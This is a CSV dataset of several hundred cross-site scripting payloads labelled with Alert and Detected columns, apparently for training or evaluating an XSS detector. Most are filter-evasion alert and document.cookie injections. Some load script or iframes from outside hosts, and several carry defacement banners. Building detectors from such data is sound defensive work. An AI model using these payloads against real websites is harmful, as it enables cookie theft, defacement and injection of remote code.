Payload,Alert,Detected
keyword=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscr<br/>ipt%3E&tag_name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&category=0&files_type<br/>%5B%5D=1&sort_by=0&search=Search,False,1
<frameset onload=javascript:javascript:alert(6159)></frameset>,False,1
search=x%22%3E%27%3E<br/>%3CscRipT%3Ealert%28123%29%3C%2FScRIpT%3E%22,False,1
ID='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E<br/>%3Cmarquee%3EWhiteHat%20Forever%3C/marque%3E,False,0
"<hr onclick=""alert(1)"">AnonKryptiQuz</hr>",False,1
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",False,1
"<slot oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<style onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></style>",False,1
"search_string=<<SCRIPT>alert(""ResisTance"");//<</SCRIPT>",False,1
<hr onpointerover=alert(1)>XSS</hr>,False,0
"where=""><script>alert(""Game%20Over!:("")</script>",False,1
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionstart=alert(1)></nobr>",False,1
nID=register;lID=1,False,0
"<animatemotion onmouseenter=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",False,1
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",False,1
<figure onpointerenter=alert(1)>XSS</figure>,False,1
Search=%22%3E%3Cimg+src%3Dfoo.png+onerror%3Dalert%28/xssed/%29<br/>;+%2F%3E,False,1
asset_id=%22%3E%3Cscript%3Ealert(420)%3C/s<br/>cript%3E,False,1
"sDestUrl=""><script>alert(""MaXWeL"")</script>",False,1
"<div onclick=""alert(1)"" style=display:block>AnonKryptiQuz</div>",False,1
%26amp%3Blt%3Bscript%26amp%3Bgt%3Balert%281%29%26amp%3Blt%3B%2Fscript%26amp%3Bgt%3B,False,1
<acronym onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</acronym>,False,1
"<samp draggable=""true"" ondragleave=""alert(1)"">test</samp>",False,1
img=03%22%3Cmarquee%3E%3Cimg%20src=k.png%20onerror=al<br/>ert(%22XSS%22)%20/%3E%22%3Cmarquee%3E%3Cimg%20src=k.png%20onerror=alert(%22XSS%22)%20/%3E,False,1
"<ol onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",False,1
"<set onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</set>",False,1
topic_id=11%22%3E%3Cmarquee%3E%3Cimg%20src=k.png<br/>%20onerror=alert(/XSS/.source)%20/%3E,False,1
sb=1&d=&search=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,False,1
q=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdparty/scrip<br/>ts/python5.js%3E%3C/SCRIPT%3E,False,1
<blockquote onpointerup=alert(1)>XSS</blockquote>,False,1
"age1=18&age2=23&height1=0&height2=300&weight1<br/>=http://www.single-russian-woman.com/cgi-bin/search.cgi?age1=18&age2=23&height1=0&height2""><script>a<br/>lert('TreX')</script>",False,1
ID=javascript:alert(1),False,1
"<xmp oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",False,1
action=summary&message=%3Cscript%3Ealert('xss')%3C/script%<br/>3E&from=login,False,1
"xss&#58;ex&#x2F;*AnonKryptiQuz*//*/*/pression(alert(\""AnonKryptiQuz\""))'&gt;",False,1
"<aside draggable=""true"" ondrag=""alert(1)"" style=display:block>test</aside>",False,1
"<embed onclick=""alert(1)"" style=display:block>test</embed>",False,1
<aside onpointerleave=alert(1) style=display:block>XSS</aside>,False,1
"<div draggable=""true"" ondrag=""alert(1)"" style=display:block>test</div>",False,1
"<style>:target {transform: rotate(180deg);}</style><figure id=x style=""transition:transform 2s"" ontransitionrun=print()></figure>",False,0
"<dl draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</dl>",False,1
searchWord=%22%3E%3Cscript%3Ealert%28%27xsse<br/>d%20by%20Langy%20www.googlebig.com%27%29%3B%3C%2Fscript%3E&x=0&y=0,False,1
article=%3Cscript%3Ealert(%22xss3d%22)%3C/script%3E,False,1
"<col draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</col>",False,1
"<code draggable=""true"" ondragleave=""alert(1)"">test</code>",False,1
time=1347983787&step=4&item_number=FNR-CAVUT<br/>OFBNM%27&term=1%20and%201=1&email=%22%3E%3Cscript%3Ealert%28/StRoNiX/%29%3C/script%3E,False,1
id=%22%3E%3Cscript%3Ealer<br/>t%28/AR3SW0RMED/%29;%3C/script%3E,False,1
"Language=""><script>alert(""MaXWeL"")</script<br/>>",False,1
search_sid=&kword=%3Cscript%3Ealert(123)%3C%2Fscript%3E,False,1
idlieu=%22%3E%3C/title%3E%3Cscript%3Ealert(123)%3C/script<br/>%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Stacker%3C/h1%3E%3C/marquee%3E,False,1
"t=';alert(String.fromCharCode(83,69,67,85,82,73,84,89,32<br/>,83,85,88))//\';alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(String.fr<br/>omCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(String.fromCharCode(83,69,67,85,82,73,8<br/>4,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,67,85,82<br/>,73,84,89,32,83,85,88))%3C/SCRIPT%3E",False,1
"<style>:target {color:red;}</style><rb id=x style=""transition:color 1s"" ontransitionstart=alert(1)></rb>",False,1
"<command onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</command>",False,1
"author=&FLDiv=and&title=&SLDiv=and&keywords=""><script>alert(""XSS<br/>bY g4br1"");</script>&section=0",False,1
recherche=gouv%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%<br/>3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,False,1
<input onpointerdown=alert(1) style=display:block>AnonKryptiQuz</input>,False,1
"<command draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</command>",False,1
terms=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&bool=and,False,1
enews=DoForPl&plid=18&classid=1&id=3&dopl=1&doajax=1&ajaxarea=<body<br/>onload=prompt(520)>,False,1
<button popovertarget=x>Click me</button><html ontoggle=alert(1) popover id=x>AnonKryptiQuz</html>,False,1
"story=""><script>alert(""MaXWeL"")</script>",False,1
url=%3E%22%3E%3CSCRIPT%3Ealert%28%27Norehem+WaS+HeRe%21%21%27<br/>%29%3C%2FSCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem+was+here%3C%2Fmarquee%3E%3C%2FH1%3E%3<br/>C%2FH1%3E%3C%2FH1%3E%3CCENTER%3E%3CIMG+SRC%3D%22http%3A%2F%2Fwww.cibernautica.com%2Fforocibernautica<br/>%2Fupload%2Fnorehemzu4.gif%22%3E%3C%2FCENTER%3E%3Ciframe+src%3Dhttp%3A%2F%2Fjersain.iespana.es%2Fxss<br/>.html+%3C&Submit=+Calcular+,False,1
<svg%0Aonload=%09((pro\u006dpt))()//,False,1
"men=""><script>alert(document.cookie)</script>><marquee><h1>By+Narcotic<br/>xs</h1></marquee>",False,1
email_user='%3E%22%3E%3Ciframe%20src=http://kusomiso.com/xss<br/>.html%20%3C,False,0
"<rtc oncopy=""alert(1)"" contenteditable>test</rtc>",False,1
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br/>[][][]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C/script%3E,False,1
Fatal=0&Severity=3&Category=3&EventID=3201&HideRe<br/>setBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%<br/>3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%<br/>20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,False,1
keywords=%3Cscript%3Ealert(31337)%3C/script%3E&x=0&y<br/>=0,False,1
"<h1 draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</h1>",False,1
lang=es-EN&updatelang=1&next=http%3A//xssed.com,False,0
context=dsgw%27%22%3E%3C/title%3E%3Cscript<br/>%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by,False,1
"<sup onmousemove=""alert(1)"" style=display:block>test</sup>",False,1
id=100586%22%3E%3Cscript%3Ealert%28document<br/>.cookie%29%3C/script%3E&brand=,False,1
"option=com_flyspray&Itemid=""><script>alert(document.cookie)<<br/>/script>><marquee><h1>(UzmiX)</h1></marquee>",False,1
autofocus ' onfocus='alert(document.domain)',False,1
jAvaScripT:(alert)`AnonKryptiQuz`,False,1
kw=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%3Cmarquee<br/>%3E%3Ch1%3EXSS+by+OxiL%3C%2Fh1%3E%3C%2Fmarquee%3E&submit=Valider,False,1
"<script src=""data:\xCB\x8F,javascript:alert(8810)""></script>",False,1
"<canvas onmouseout=""alert(1)"">test</canvas>",False,1
q=%3Cscript%3Ealert(123)%3C%2Fscript%3E&cx=004416812484641476093%3A<br/>fc5bmsmphlm&cof=FORID%3A9&ie=UTF-8&cof=FORID%3A11&newwindow=1&as_q=more%3Adownloads&hq=more%3Adownlo<br/>ads&sa=Search,False,1
"<noframes draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</noframes>",False,1
"<div draggable=""true"" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable style=display:block>drop here</picture>",False,1
url=%0AContent-Type:%20text/html%0AContent-Length:16%0A%0Atest......<br/>......,False,0
<data onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<audio onmouseup=""alert(1)"">test</audio>",False,1
<caption onwebkitmouseforceup=alert(1)>XSS</caption>,False,1
"query=results'""></title><script>alert(1)</script>'<br/>""><marquee><h1>XSS by Viper.aT</h1></marquee>",False,1
"<sup draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</sup>",False,1
<img2 onwebkitwillrevealbottom=alert(1)>XSS</img2>,False,1
"""><img src=x id=""img""> <script>document.getElementById('img').addEventListener('error', function(){prompt(document.domain);})</script>",False,1
"email=""><script>alert(/Shocker @<br/>www.ShockingSoft.com/)</script>",False,1
"<option draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</option>",False,1
id=60&nt=113&lang=1&ns=%22%3E%3Cscript%3Ealert(/%20xssed%20!%20/)%3C/<br/>script%3E%3Cmarquee%3E%3Ch1%3Eby%20k1ll3r_null%3C/h1%3E%3C/marquee%3E,False,1
id=Arama,False,0
session=&errorcode=2&arg1a=46&arg2a=<script>alert(/THE-SH0<br/>CK-B0Y/)</script>,False,1
"<tt onmousedown=""alert(1)"">AnonKryptiQuz</tt>",False,1
"<th onkeypress=""alert(1)"" contenteditable>test</th>",False,1
sect=&nh=20&st=1&adv=0&rf=%28null%29&menu=%C5%EB%C7%D5<br/>%B0%CB%BB%F6&qt='%3E%22%3E%3CIMG%20src=no_such_icon%20onerror=alert(document.cookie);%3E%3Cmarquee%3<br/>E%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E%3C/marquee%3E&x=0&y=0&field=0&search_period=all&sDate=&eDate=,False,1
gamespotURL=%22%3E%3Ctitle%3EMTV.com%20-<br/>%20XSS%20PoC%20-%20daltd%3C%3C//title%3E%3Cscript%3Ealert('XSS');%3C/script%3E,False,1
"cmd=search&land=nl&searchval=""><scRipT>alert(123)</scRip<br/>T>""&Submit=zoeken&lang=nl",False,1
"oid=""><script>alert(document.cookie)</script><h1>By S@rExT</h1>",False,1
"<xss draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</xss>",False,1
<del onpointerenter=alert(1)>XSS</del>,False,1
"cmd=""><script>alert('TreX')</script>",False,1
<select onpointerout=alert(1) style=display:block>AnonKryptiQuz</select>,False,1
"conf=""><script>alert(""s0m.ph"");</script>",False,1
"<footer draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</footer>",False,1
"folder=test&n=""><script>alert(document.cookie)</scr<br/>ipt>><marquee><h1>By+Narcoticxs</h1></marquee>",False,1
txtSearch=%22%3E%3Cscript%3Ealert(%2Fwww.sec-r1z.com%2F)%3C%2Fs<br/>cript%3E%22%3E%3C%2Fscript%3E,False,1
query=%3Cscript%3Ealert%28%22modakabam%22%29<br/>%3C/script%3E,False,1
"<dt onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</dt>",False,1
q=%22%3Cscript+src%3Dhttp://vuln.xssed.net/thirdparty/scripts/hotpock<br/>ets.js%3E,False,1
"redirect=index.cfm%22%3E%3Cscript%3Ewindow.location.assign(""http://<br/>www.reddit.com/r/xss/"")%3C/script%3E",False,1
<script>+-+-1-+-+alert(4141)</script>,False,1
"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",False,1
"q=%3Cscript%3Ealert(String.fromCharCode(87,111,111,100,121))%3C/scrip<br/>t%3E",False,1
id=1'%22%3E%3C/title%3E%3Cscript%3Ealert(document.co<br/>okie)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3Eisoz%20was%20here%3C/h1%3E%3C/marquee%3E,False,1
geo=geo&search_string=%22%3E%3Cscript%3Ealert%28%2FXssed+By+FeDeReR%2F%<br/>29%3C%2FscRipT%3E%22&sec_id=105&lang_id=GEO,False,1
dettagli=%3E%22%3E%3Cscript%3Ealert%28%27iNs%20-%20uNkn0wn.<br/>eu%27%29%3C%2Fscript%3E,False,1
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,False,1
q=%3Cfont+color%3Dred%3E%3Cmarquee%3EMutant+Hacked+This+Page%3C%2F<br/>marquee%3E%3Cbr%3EEwilhelm+should+be+ashamed%3Cbr%3E%3Cbr%3E+%3Cmarquee%3Ej00+g0t+0wn3d%3C%2Fmarquee<br/>%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cimg+src%3D%22http%3A%2F%2F0wn3d.dk%2Fowned%2Fbmwowned.jpg%3E&limit%3At<br/>ype%3Ainstructable=on&type%3Ainstructable=on&type%3Auser=on&type%3Acomment=on&type%3Agroup=on&type%3<br/>AforumTopic=on,False,1
<map onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</map><input value=clickme>,False,1
<Img Src=OnAnonKryptiQuz OnError=confirm(1)>,False,1
ErrTxt=<script>alert(1)</script>,False,1
q=%22%3E%3Ch1%3E%3Cmarquee%3E---+XSSED+---%3C%2Fmarq<br/>uee%3E%3C%2Fh1%3E&c=193&Submit.x=0&Submit.y=0&Submit=Go%21,False,0
"<slot onmouseleave=""alert(1)"">AnonKryptiQuz</slot>",False,1
searchQ=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,False,1
"<style>:target {transform: rotate(180deg);}</style><ul id=x style=""transition:transform 2s"" ontransitionrun=print()></ul>",False,0
"<form onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</form>",False,1
id=70%22%3E%3Ch1%3EXSS%20by%20WHK%3Cscript%3<br/>Ealert(/XSS%20by%20WHK/);%3C/script%3E&index=1%22%3E%3Ch1%3E%3Cbr%3EXSS%20by%20WHK%3Cbr%3E%3Cbr,False,1
keyword=%3Ciframe%20src=http://www.google.com<br/>%3E%3C/iframe%3E,False,0
<nobr onwebkitmouseforceup=alert(1)>XSS</nobr>,False,1
i_keyword=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&Submi<br/>t=GO,False,1
NRMODE=Published&NRNODEGUID=%7bA85<br/>F8395-EC74-4CE7-AFBB-2251E8AD8772%7d&NRORIGINALURL=%2fSearch&NRCACHEHINT=Guest,False,0
"campo=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR%20-%20F<br/>ROM%20TURKEY/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY</h1></marquee",False,1
Rehber_Ad=%3Cscript%3Ealert('CoRSaNTuRK')%3B%3C/script%3E&Harf=0,False,1
OBJET=formation&QUERY=%3Cscript%<br/>3Ealert%20(document.cookie);%3C/script%3E&CODE_RUBRIQUE=&SEARCH_SOUSRUBRIQUES=true&LANGUE_SEARCH=0,False,1
"<link oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",False,1
<spacer onpointermove=alert(1)>XSS</spacer>,False,1
"<a2 onmouseup=""alert(1)"" style=display:block>test</a2>",False,1
plugin=CountryLocator%22%3E%3Cscript%3Ealert(/Airr<br/>oxssed/[-1]);%3C/script%3E,False,1
hata=1&CID=%3ch1%3ehacked%20by%20CiCoSz%20%3c/<br/>h1%3e,False,0
"<object onmouseout=""alert(1)"">test</object>",False,1
<svg id=x onfocus=alert(1)>,False,1
"<div onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</div>",False,1
st_cd=ID&fips=16&name=Idaho<script>ale<br/>rt(1)</script>,False,1
"strLetter=q&liFilters=About,Information%27%22%3E%3C/title%3E%<br/>3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E",False,1
searchText=%3C%22%3C%3CsCrIpT%3Ealert%28document.cookie%29%3C%2FsCr<br/>IpT%3E%3C%22%3C%3CsCrIpT%3Ealert%28document.cookie%29%3C%2FsCrIpT%3E%3C%22%3C%3CsCrIpT%3Ealert%28doc<br/>ument.cookie%29%3C%2FsCrIpT%3E&categoryId=,False,1
id=%22%3E%3Cscript%3Ealert(/XsS/)%3C/script%3E,False,1
"date=&query=""><script>alert(/www.r3t.n3t.nl<br/>/)</script>",False,1
"buscar=""><scRipT>alert(123)</scRipT>&vi<br/>ene=1",False,1
"<custom tags oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
inctyp=%22%3E%3Cbody+onload=alert(%22By%20Encore%2<br/>2)%3E%3Cmarquee%3E%3Ch1%3EUNUTAMADIM%20:(%20%20%20%3C/h1%3E%3Ch2%3E%20By%20Encore%20%3C/h2%3E,False,1
backUrl=%22%3E%3Cscript%3Ealert(%22FullFreeez Was<br/>Here%22);%3C/script%3E,False,1
SearchKey=%22%3E%3Cscript%3Ealert(document.coo<br/>kie)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E%3C/marquee%3E,False,1
s=%22%3E%27%3E%3CScRiPt%3Ealert%28123%29%3C%2FsCrIpT%3E%22%27&=Search,False,1
q=foo%3C/title%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,False,1
"<video onloadstart=""alert(1)""><source></*>",False,1
<body onload=alert(/AnonKryptiQuz/.source)>,False,1
type='%22%3E%3Ch1%3EOwnz%20Your%20System%20By%20Vagrant%<br/>3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarquee%3E%20Ownz%20Your%20System%20by%20Vagrant%3C/marque%3E,False,1
searchtext=%22%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E&x=23&y=15,False,1
CISOOP1=all&CISOBOX1=%3E%22%3E%3CSCRIPT%3Ealert('Norehem<br/>%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3<br/>E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica<br/>/upload/norehemzu4.gif%22%3E%3C/CENTER%3E%3Ciframe%20src=http://jersain.iespana.es/xss.html%20%3C&CI<br/>SOFIELD1=CISOSEARCHALL&CISOOP2=exact&CISOBOX2=&CISOFIELD2=CISOSEARCHALL&CISOOP3=any&CISOBOX3=&CISOFI<br/>ELD3=CISOSEARCHALL&CISOOP4=none&CISOBOX4=&CISOFIELD4=CISOSEARCHALL&CISOROOT=all&t=a,False,1
"<em onbeforepaste=""alert(1)"" contenteditable>test</em>",False,1
search_id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2F<br/>script%3E&search_type=search_videos&x=52&y=12,False,1
<tr onwebkitmouseforceup=alert(1)>XSS</tr>,False,1
zoom_query=%22/%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&sear<br/>ch=1&lang=es,False,1
idc=&idp=&id=%22%3Cimg%20src=http://www.frant<br/>z-info.com/wp-content/uploads/2008/12/doigt-fuck.jpg%20onerror=alert%28/XSS/%29%20/%3E,False,1
<tfoot onpointercancel=alert(1)>XSS</tfoot>,False,1
"ktgr1=<b>Owz Y0u Comando</b><script>alert(""Comando"")</script>",False,1
"<image onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</image>",False,1
"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",False,1
<marquee onpointerdown=alert(1) style=display:block>XSS</marquee>,False,1
"<input2 draggable=""true"" ondragend=""alert(1)"" style=display:block>test</input2>",False,1
<strong id=x tabindex=1 onactivate=alert(1)></strong>,False,1
<button popovertarget=x>Click me</button><section onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</section>,False,1
query=%3Cscript%20src=http://cpanel2.my-php.net/xss.js<br/>%3E%3C/script%3E,False,1
Fatal=0&Severity=1&Category=3&EventID=3200&Hid<br/>eResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%<br/>3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CI<br/>MG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,False,1
<big onpointerout=alert(1)>XSS</big>,False,1
<audio onpointerout=alert(1) style=display:block>XSS</audio>,False,1
"<spacer onmouseout=""alert(1)"">test</spacer>",False,1
"id=1499""><script>alert(document.cookie)</script>",False,1
<input id=x tabindex=1 onactivate=alert(1)></input>,False,1
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdo>",False,1
keywords=%27%3E%3Cscript%3Ealert%28%22www.r3t.n3t<br/>.nl%22%29%3C%2Fscript%3E&curpage=1&kind=1,False,1
<kbd oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"id=54""><script>alert(document.cookie)</scr<br/>ipt>",False,1
Field=Title&BigClassName=%3Cscript%3Ealert(%22XSS%22)%3C/script%3<br/>E&SmallClassName=&keyword=XSS&Submit=SEARCH,False,1
q=%22%3E%3Cscript%3Ealert%28%2FKiller-TR+Ownz%2F%29%3C%2Fscript%3E,False,1
keywords=%3C%2Fscript%3E%3Cscript%3Ealert%28%22NoPh0BiA<br/>%22%29%3C%2Fscript%3E&x=0&y=0,False,1
lang=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/s<br/>cript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,False,1
"<rtc draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</rtc>",False,1
"searchtext=%3CSCRIPT%3Ealert(String.fromCharCode(88,%2083,%2083,<br/>%2032,%2066,%20121,%2032,%2077,%20101,%20116,%20104,%20111,%20100,%2046,%2088))%3C/SCRIPT%3E",False,1
"<slot onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",False,1
flash='/><script>alert('XSSED by<br/>Ahlspiess')</script><var=',False,1
t=p&d=syneu&s=ps&c=wg&l=dir&o=0&sv=0a300589&ip=5512c9a9&id=D14365C8527A655E4F3<br/>EAFC2ADB6972A&q=googlebig&p=1&qs=121&ac=24&g=5b16ks+WgFG6Yi&en=te&io=0&b=alg&tp=d&ec=10&pt=GoogleBig<br/>&ex=&url=&u=http://www.googlebig.com,False,0
<q onblur=alert(1) id=x tabindex=1 style=display:block>test</q><input value=clickme>,False,1
